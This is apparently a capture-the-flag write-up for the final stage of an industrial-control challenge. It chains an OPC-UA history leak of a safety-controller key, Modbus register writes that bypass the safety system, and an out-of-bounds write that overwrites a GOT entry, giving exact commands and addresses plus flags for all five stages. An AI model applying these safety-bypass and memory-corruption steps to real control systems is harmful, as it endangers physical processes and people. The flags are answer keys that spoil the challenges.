# Reentry Bay 5/5 — Persistent Hold

**Flag:** `reentry{b0und3d_00b_p1v0t3d_p4st_th3_s4f3ty_sys}`
**Override fragment:** `KEPLER-OVR-5:e79ca6d8fda94f69`

| | |
|---|---|
| Category | OT/ICS · multi-protocol chain (OPC-UA history → Modbus → sequencer OOB write) |
| Targets | Modbus `tcp.reentry.lol:30391`, OPC-UA `:30610`, sequencer console `:30294` (offline now) |
| Files | none |

> **Challenge brief:** A paused countdown is a countdown LAZARUS can un-pause — and the bay's safety
> controller will do it for him roughly twenty seconds after you latch it, unless you have already
> persuaded it to stand down. The engineering console will write a step anywhere in its table without
> ever asking whether the table is that long. Where that table actually lives is worth knowing before
> you reach past the end of it.

The theme across the bay is **incomplete access control**; the final latch chains three protocols.

---

## Step 1 — Leak the SIS key via OPC-UA history

The `MAINT.Note` node (`ns=2;i=3`) said "see maintenance log history". A **HistoryRead**
(`read_raw_history`) on that node reveals an un-purged maintenance log:

```
2019-04-03 eng key for the safety controller: SIS-KEY-D188B1EB
2019-04-03 REMINDER: purge this note before audit   <- never done
```

The OPC-UA trust list is still unconfigured (as in stage 3), so a self-signed cert with SAN
`urn:meridian:client` + `Basic256Sha256`/`SignAndEncrypt` gets in.

## Step 2 — Modbus Hold Controller (unit 40): bypass the SIS, leak the ENG token

Unit 40 (`tcp...:30391`, no auth) describes itself:
`HOLD CTRL :: ILOCK=HR30:HR31 :: MAINT via OPC-UA :: SIS BYPASS KEY=HR120`. This Modbus server has
logic (not a dumb datastore):

- Write `SIS-KEY-D188B1EB` (ASCII) to **HR120** → status @HR140 becomes
  `"SIS BYPASSED - safety will not revert the hold"`.
- Write the interlock (`derive_interlock(serial)=f3dcc02e` from stage 4) to **ILOCK HR30:HR31** in
  **word-swapped** order (`0xc02e, 0xf3dc`) → the hold controller reveals the console's
  **engineering override token** @HR90+: `ENG-OVR-D74F8B`.

## Step 3 — Sequencer console (`tcp...:30294`): OOB write to the GOT → persistent_hold

```
AUTH ENG-OVR-D74F8B          -> engineering override accepted
SEQ -12 4226421              -> overwrite the strcmp GOT entry with &persistent_hold
AUTH q                       -> AUTH calls strcmp() -> jump to persistent_hold() -> flag
```

### Reverse engineering (sequencer.elf, non-PIE)

`SEQ <idx> <val>` → `PROG0_body__` writes with **no bounds check**:

```
addr = PLC(0x40b360) + (idx+2)*16 + 0x10      ; stride 16
*(addr) = val
```

The grid lands on addresses ending in `0x0` → overwritable GOT entries: `puts 0x40b290(idx-16)`,
`printf 0x40b2a0(-15)`, `fputs 0x40b2b0(-14)`, `strcmp 0x40b2d0(-12)`, etc.
`val = &persistent_hold = 0x407d75 = 4226421`.

### Trap: the guard (force-bit)

Before writing, `PROG0_body__` checks the byte at `addr-8` (`& 2`) and **skips** the write if set.
`addr-8` is the GOT of the preceding function:

- Targeting **puts** (idx-16) → guard = GOT of `_exit` (unresolved → points at PLT+6 = `0x401056`,
  byte `0x56 & 2 = 2` → always skipped). That is why `SEQ -16` only said "step written".
- Every **unresolved** guard = a PLT push at `...6` → `0x_6 & 2 = 2` → blocked.
- Target a function whose guard is one **already called** (resolved to libc). libc is page-aligned,
  so the low byte of the address is fixed (offset in libc), deterministic. **idx=-12** (target
  `strcmp`, guard `fgets` — resolved) → guard clear → the write goes through. Trigger: the next
  `AUTH q` calls `strcmp()` → `persistent_hold`.

## Output

```
[!] PERSISTENT HOLD LATCHED -- countdown frozen; the safety system will not revert it ...
reentry{b0und3d_00b_p1v0t3d_p4st_th3_s4f3ty_sys}
KEPLER-OVR-5:e79ca6d8fda94f69
```

🚩 **Flag:** `reentry{b0und3d_00b_p1v0t3d_p4st_th3_s4f3ty_sys}`
**Override fragment:** `KEPLER-OVR-5:e79ca6d8fda94f69` (collected in the [README](../README.md) → *Master-override fragments*).

> **Note:** All three services are offline now, so the chain cannot be re-run. The one piece that is
> reproducible offline — `derive_interlock("SEQ-6CA3F02E") = 0xf3dcc02e`, word-swapped `0xc02e,
> 0xf3dc` — I verified (see stage 4). The `w0rd_0rd3r_...` HR200 text from stage 2 is a deliberate
> decoy relative to this final flag; the real flag is read by `persistent_hold` from `flag.txt`.

---

## Reentry Bay — complete (1–5)

| # | Name | Vulnerability | Flag |
|---|------|---------------|------|
| 1 | Deorbit HMI | Zip Slip → RCE | `reentry{z1p_sl1p_d3pl0y3d_th3_hm1_pr0j3ct}` |
| 2 | Thruster Telemetry | Modbus, no auth + word-order | `reentry{w0rd_0rd3r_unm4sk3d_th3_thrust3r_fl04ts}` |
| 3 | Maintenance Endpoint | OPC-UA missing trust list (self-signed) | `reentry{s3lf_s1gn3d_1nt0_th3_0pcu4_trust_l1st}` |
| 4 | Sequencer Firmware | FNV-1a interlock derivation (RE) | `reentry{r3v3rs3d_th3_1nt3rl0ck_d3r1v4t10n}` |
| 5 | Persistent Hold | OPC-UA history → Modbus → sequencer OOB-write to GOT | `reentry{b0und3d_00b_p1v0t3d_p4st_th3_s4f3ty_sys}` |

> **Previous:** [4 - Sequencer Firmware](4%20-%20Sequencer%20Firmware.md)
>
> **Reentry Bay: 5/5 — COMPLETE.** 🏁
